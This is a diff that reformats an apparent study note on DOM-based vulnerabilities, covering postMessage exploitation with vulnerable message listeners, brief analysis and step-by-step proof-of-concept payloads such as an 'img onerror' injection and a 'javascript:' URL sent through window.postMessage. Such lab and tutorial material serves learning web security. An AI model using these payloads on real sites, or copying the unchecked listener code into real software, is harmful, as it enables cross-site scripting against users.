@@ -55,7 +55,7 @@ This is vulnerable to DOM-based open redirection because the `location.hash` sou
  
  ## Exploiting web message 
  
- 1- Exploit the postMessage Vulnerability:
+ **1- Exploit the postMessage Vulnerability:**
   ```js
   Here is vulnerable code:
   window.addEventListener('message', function(e) {
@@ -63,14 +63,14 @@ This is vulnerable to DOM-based open redirection because the `location.hash` sou
    })
 
   ```
-   Exploit:
+   *Exploit:*
     - Goto the source tab add breakpoint to document.getElement
     - Goto the console tab
     - window.postMessage('<img src=x onerror=alert(1)>','*')
     - You should get alert popup
 
 
-2- Explot postMessage Vulnerability:
+**2- Explot postMessage Vulnerability:**
 
   Here is vulnerable code:
   ```js
@@ -82,13 +82,15 @@ This is vulnerable to DOM-based open redirection because the `location.hash` sou
   }, false);
   ```
 
-    Analysis:
-    This script sends a web message containing an arbitrary JavaScript payload, along with the string "http:". The second argument specifies that any targetOrigin is allowed for the web message.
+   *Analysis:*
+    This script sends a web message containing an arbitrary JavaScript payload, along with the string "http:". The second argument 
+    specifies that any targetOrigin is allowed for the web message.
 
-    When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
+   When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the 
+   "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
 
-  Exploit: 
-    1- Goto the developer tool in source tab add breakpoint to the `url` var
+  **Exploit:** 
+    1- Goto the developer tool in source tab add breakpoint to the `url` var.    
     2- Then goto the console tab type 
         window.postMessage('javascript:alert(1)//http:','*')
     3- You can Iframe to exploit for poc
